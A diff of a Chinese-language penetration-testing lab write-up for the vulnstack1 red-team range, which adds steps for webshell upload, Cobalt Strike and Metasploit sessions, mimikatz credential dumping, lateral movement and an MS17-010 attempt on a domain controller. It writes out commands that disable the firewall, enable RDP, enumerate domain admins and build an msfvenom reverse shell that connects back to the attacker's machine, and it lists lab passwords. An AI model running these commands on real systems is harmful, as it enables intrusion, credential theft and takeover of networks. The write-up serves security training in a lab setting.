@@ -142,7 +142,6 @@ Nmap done: 1 IP address (1 host up) scanned in 127.99 seconds
 访问`http://192.168.1.9`得到php探针页面，泄露服务器相关信息：
 ![](../../attaches/Pasted%20image%2020220912173613.png)
 ![](../../attaches/Pasted%20image%2020220912173653.png)
-
 下方数据库连接检测处尝试爆破mysql密码。
 **从此开始kali ip变更为192.168.1.131；win7 ip变更为192.168.1.133**
 打开proxy拦截MySQL检测数据包，`C-i`传到攻击模块中，猜测存在root用户，密码处添加爆破点，选择字典开始爆破。
@@ -150,25 +149,18 @@ Nmap done: 1 IP address (1 host up) scanned in 127.99 seconds
 
 发现存在弱口令root/root，在kali终端中尝试远程连接`mysql -h 192.168.1.133 -P 3306 -u root -p root`（一般设了禁用远程连接不会成功）。
 ![](../../attaches/Pasted%20image%2020220913174154.png)
-
 用御剑扫描网站的目录。
 ![](../../attaches/Pasted%20image%2020220913174825.png)
-
 显然存在网站备份beifen.rar
 ![](../../attaches/Pasted%20image%2020220913175202.png)
-
 phpinfo界面
 ![](../../attaches/Pasted%20image%2020220913175337.png)
-
 phpmyadmin管理后台
 ![](../../attaches/Pasted%20image%2020220913175358.png)
-
 用root/root登录phpmyadmin，脱库。
 ![](../../attaches/Pasted%20image%2020220913180314.png)
-
 admin表中存在密码信息
 ![](../../attaches/Pasted%20image%2020220913180351.png)
-
 尝试用md5破解
 ![](../../attaches/Pasted%20image%2020220913180424.png)
 
@@ -324,23 +316,117 @@ D:.
 猜测网站url为`http://192.168.1.133/yxcms/`，访问。
 ![](../../attaches/Pasted%20image%2020220913181026.png)
 公告信息中泄露了后台入口和管理员账号密码。
+
 ![](../../attaches/Pasted%20image%2020220913182118.png)
 ### 渗透
 登录后台
 ![](../../attaches/Pasted%20image%2020220913182327.png)
-
 前台模板处可以文件上传
 ![](../../attaches/Pasted%20image%2020220913190644.png)
-
 上传木马
 ![](../../attaches/Pasted%20image%2020220913212204.png)
-
 在网站备份中检索特征字符串，找到文件上传的位置。
 ![](../../attaches/Pasted%20image%2020220913191620.png)
+三个路径都试一下，得到core的位置：`http://192.168.1.133/yxcms/protected/apps/default/view/default/core.php`，用蚁剑连接成功get shell。
+![](../../attaches/Pasted%20image%2020220914161417.png)
+### 内网渗透
+启动CS服务端
+![](../../attaches/Pasted%20image%2020220914164256.png)
+启动CS客户端。
+![](../../attaches/vmware_4SGvglYN2S.png)
+添加监听器。
+![](../../attaches/Pasted%20image%2020220914181611.png)
+生成后门。
+![](../../attaches/Pasted%20image%2020220914180807.png)
+在蚁剑中上传木马。
+![](../../attaches/Pasted%20image%2020220914182103.png)
+执行木马文件，CS上线。
+![](../../attaches/Pasted%20image%2020220914182236.png)
+获取密码凭证。
+![](../../attaches/Pasted%20image%2020220914183859.png)
+使用mimikatz抓取明文密码。
+![](../../attaches/Pasted%20image%2020220914182914.png)
+观察到在god域中Administrator的密码为hongrisec@2022。
 
-三个路径都试一下，得到core的位置，用蚁剑连接成功getshell。
-![](../../attaches/Pasted%20image%2020220913211934.png)
+执行命令开启靶机的3389端口并关闭防火墙。
+```
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
 
+关闭防火墙
+netsh firewall set opmode disable   			#winsows server 2003 之前
+netsh advfirewall set allprofiles state off 	#winsows server 2003 之后
+```
+![](../../attaches/Pasted%20image%2020220914183429.png)
+执行命令查看域中的信息。
+```
+net group /domain  #查看域内所有用户列表
+net view /domain
+net view /domain:god
+net group "domain computers" /domain #查看域成员计算机列表
+net group "domain admins" /domain #查看域管理员用户
+```
+![](../../attaches/Pasted%20image%2020220914185811.png)
+![](../../attaches/Pasted%20image%2020220914185908.png)
+远程桌面登录靶机。
+![](../../attaches/Pasted%20image%2020220914184503.png)
+![](../../attaches/Pasted%20image%2020220914184551.png)
+ipconfig得到内网网段：192.168.52.1/24。
+![](../../attaches/Pasted%20image%2020220914185144.png)
+上传局域网查看器，并扫描内网存活主机。
+![](../../attaches/Pasted%20image%2020220914190106.png)
+根据之前获取到的域内信息，除本机外存在域控OWA（192.168.52.138）、域成员ROOT-TVI862UBEH（192.168.52.141），并得知二者的系统信息。
+**分支1：**
+右键目标使用svc-exe进行提权看到system上线。
+![](../../attaches/Pasted%20image%2020220914201213.png)
+
+在kali中打开msf，并执行以下命令准备一个监听，准备将shell从cs移交给msf。
+```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set lhost 0.0.0.0
+set lport 2222
+```
+![](../../attaches/Pasted%20image%2020220914191551.png)
+在CS中新建一个监听器，payload选择foreign http，地址和端口都和kali保持一致。
+![](../../attaches/Pasted%20image%2020220914191827.png)
+右键CS中的靶机选择新建会话，payload选择刚创建的Amsf。
+![](../../attaches/Pasted%20image%2020220914191925.png)
+发现无论如何都不出网，尝试用msf生成木马
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.131 LPORT=2222 -f exe > shell.exe
+```
+![](../../attaches/Pasted%20image%2020220914200033.png)
+原型改为reverse_tcp，开始监听，用蚁剑上传木马并执行。
+![](../../attaches/Pasted%20image%2020220914200135.png)
+msf成功收到连接。
+![](../../attaches/Pasted%20image%2020220914200506.png)
+执行`migrate -N explorer.exe`迁移到不易被关闭的进程上。
+![](../../attaches/Pasted%20image%2020220914203141.png)
+执行`run get_local_subnets`获得当前子网，执行`run autoroute -s 192.168.52.0/24`添加路由（background挂起会话后运行`route add 10.1.81.0/24 1`），执行`run autoroute -p`查看当前存活路由表。
+![](../../attaches/Pasted%20image%2020220914203117.png)
+在win7上发现nmap，扫描一下域控开启的端口。
+![](../../attaches/Pasted%20image%2020220914204401.png)
+端口445开启疑似存在ms17-010漏洞，回到msf测试一下，执行如下命令。
+```
+background
+search ms17-010
+use 3
+set rhosts 192.168.52.138
+run
+```
+![](../../attaches/Pasted%20image%2020220914205037.png)
+仿佛可以利用，执行如下命令。
+```
+search ms17-010
+use 0
+set payload windows/x64/meterpreter/bind_tcp
+set rhosts 192.168.52.138
+set lport 11111
+```
+利用不成功，报不能建立SMBv1连接。
+![](../../attaches/Pasted%20image%2020220914210557.png)
+经过百度发现需要开启postgresql服务，重新run。
+![](../../attaches/Pasted%20image%2020220914210516.png)
 ## vulnstack2
 ### 官方介绍
 红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX
